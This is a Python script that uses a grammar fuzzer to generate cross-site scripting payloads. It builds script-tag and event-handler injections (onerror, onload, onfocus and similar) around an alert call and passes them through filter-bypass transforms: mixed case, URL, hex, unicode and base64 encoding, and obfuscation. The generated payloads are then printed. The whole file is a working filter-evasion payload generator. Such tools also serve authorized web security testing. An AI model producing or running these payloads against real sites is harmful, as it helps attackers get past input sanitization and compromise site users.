from fuzzingbook.WebFuzzer import *
from xss_bypass import *
import random
import time

random.seed(time.time())


def exec_func(functions, arg: str) -> list[str]:
    result: list[str] = []

    for func in functions:
        result.append(func(arg))

    return result


def get_bypass_alert():
    alerts: list[func] = [none, obfuscate_alert1, obfuscate_alert2, obfuscate_alert3,
             obfuscate_alert4, obfuscate_alert5, obfuscate_alert6, obfuscate_alert7,
             obfuscate_alert8, obfuscate_alert9, obfuscate_alert10, obfuscate_alert11,
             obfuscate_alert12, obfuscate_alert13, obfuscate_alert14, obfuscate_alert15,
             obfuscate_alert16, obfuscate_alert17, obfuscate_alert18]

    return alerts


def get_bypass_script():
    scripts: list[func] = [none, mix_case, url_encoding, insert_string, html_hex_encode, unicode_encode]

    return scripts


def get_bypass_event_handler():
    event_handlers: list[func] = [none, mix_case, insert_string, add_newline, obfuscate_event_handler]

    return event_handlers


def get_bypass_javascript():
    javascripts: list[func] = [none, html_hex_encode, insert_meaningless_char, obfuscate_javascript, base64_text]

    return javascripts


def get_base64_payload():
    base64_payload: list[func] = [none, base64_image, base64_application]

    return base64_payload


def xss_script() -> list[str]:
    alerts: list[str] = exec_func(get_bypass_alert(), 'alert(67777)')

    XSS_Grammar: Grammar = {
        '<start>': ['<xss>'],
        '<xss>': ['<start-tag><content><end-tag>'],
        '<start-tag>': ['<left-angle><script><right-angle>'],
        '<content>': ['<alert>'],
        '<end-tag>': ['<left-angle>/<script><right-angle>'],
        '<alert>': alerts,
        '<script>': ['script'],
        '<left-angle>': ['<'],
        '<right-angle>': ['>']
    }

    payloads: list[str] = []

    for _ in range(100):
        xss_fuzzer = GrammarFuzzer(XSS_Grammar)
        payload: str = xss_fuzzer.fuzz()
        bypass = random.choice(get_bypass_script())
        payload = payload.replace('<script>', bypass('<script>'))
        payload = payload.replace('</script>', bypass('</script>'))

        payloads.append(payload)

    payloads = list(set(payloads))

    return payloads


def xss_event_handler() -> list[str]:
    alerts: list[str] = exec_func(get_bypass_alert(), 'alert(67777)')

    XSS_Grammar: Grammar = {
        '<start>': ['<xss>'],
        '<xss>': ['<tag-attr> <event-handler>'],
        '<tag-attr>': ['<left-angle><tag>'],
        '<event-handler>': ['<event-attr>="<alert>"<right-angle>'],
        '<tag>': ['img src="invalid.jpg"', 'img src="https://github.com/silvergun8291/test/blob/master/XSS.png?raw=true"',
                  'iframe', 'a href="#"', 'input type="text"', 'body', 'textarea rows="10" cols="50"',
                  'div style="position:fixed;left:0;top:0;width:9999px;height:9999px;"'],
        '<event-attr>': ['onerror=', 'onload=', 'onclick=', 'autofocus onfocus=',
                            'onmouseover=', 'onmousedown=', 'onmouseup=', 'onmousemove='],
        '<alert>': alerts,
        '<left-angle>': ['<'],
        '<right-angle>': ['>'],
    }

    payloads: list[str] = []

    for _ in range(100):
        xss_fuzzer = GrammarFuzzer(XSS_Grammar)
        payload: str = xss_fuzzer.fuzz()
        payloads.append(payload)

    payloads = list(set(payloads))

    return payloads



if __name__ == '__main__':
    payloads_script = xss_script()
    payloads_event_handler = xss_event_handler()

    for payload in payloads_event_handler:
        print(payload)

